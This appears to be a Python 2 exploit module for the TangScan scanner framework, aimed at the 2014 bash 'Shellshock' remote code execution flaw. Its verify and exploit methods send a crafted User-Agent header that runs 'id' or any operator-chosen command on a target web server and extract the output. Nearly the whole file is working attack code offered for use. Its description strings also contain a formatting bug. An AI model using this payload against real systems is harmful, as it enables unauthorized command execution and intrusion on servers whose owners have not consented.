#! /usr/bin/env python
# -*- coding: utf-8 -*-

import re

from thirdparty import requests
from modules.exploit import TSExploit


__all__ = ['TangScan']


class TangScan(TSExploit):
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "bash 远程代码执行漏洞",
            "product": "bash",
            "product_version": "3.0-4.3",
            "desc": """
                bash 3.0-4.3 存在一个漏洞，该漏洞可以通过构造环境变量的值来执行任意的脚本代码
            """,
            "license": self.license.TS,
            "author": ["wooyun"],
            "ref": [
                {self.ref.url: "https://www.invisiblethreat.ca/2014/09/cve-2014-6271/"},
            ],
            "type": self.type.rce,
            "severity": self.severity.high,
            "privileged": False,
            "disclosure_date": "2014-09-17",
            "create_date": "2014-09-17"
        }

        self.register_option({
            "url": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.url_field,
                "desc": "target url"
            },
            "cmd": {
                "default": "id",
                "required": False,
                "choices": [],
                "convert": self.convert.str_field,
                "desc": "command"
            }
        })

        self.register_result({
            "status": False,
            "data": {
                'cmd_info': {
                    'cmd': '',
                    'output': ''
                }
            },
            "description": "",
            "error": ""
        })

    def verify(self):
        re_pattern = re.compile(r'~~~(.*?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        exp_headers = {'user-agent': r'''() { :; }; echo; echo ~~~`id`~~~'''}

        try:
            response = requests.get(self.option.url, headers=exp_headers, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_pattern.findall(response.content)
        if not response.content.startswith('~~~') or not re_result:
            return

        self.result.status = True
        self.result.data.cmd_info.output = re_result[0]
        self.result.description = "目标 {url} 存在 bash 远程代码执行漏洞, 执行 id 命令结果: {cmd_info}".format(
            host=self.option.url,
            cmd_info=re_result[0]
        )

    def exploit(self):
        re_pattern = re.compile(r'~~~(.*?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        exp_headers = {
            'user-agent': '() {{ :; }}; echo; echo ~~~`{command}`~~~'.format(command=self.option.cmd)
        }

        try:
            response = requests.get(self.option.url, headers=exp_headers, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_pattern.findall(response.content)
        if not response.content.startswith('~~~') or not re_result:
            return

        self.result.status = True
        self.result.data.cmd_info.cmd = self.option.cmd
        self.result.data.cmd_info.output = re_result[0]
        self.result.description = "目标 {url} 存在 bash 远程代码执行漏洞, 执行 {cmd} 命令结果: {cmd_info}".format(
            host=self.option.url,
            cmd=self.option.cmd,
            cmd_info=re_result[0]
        )


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
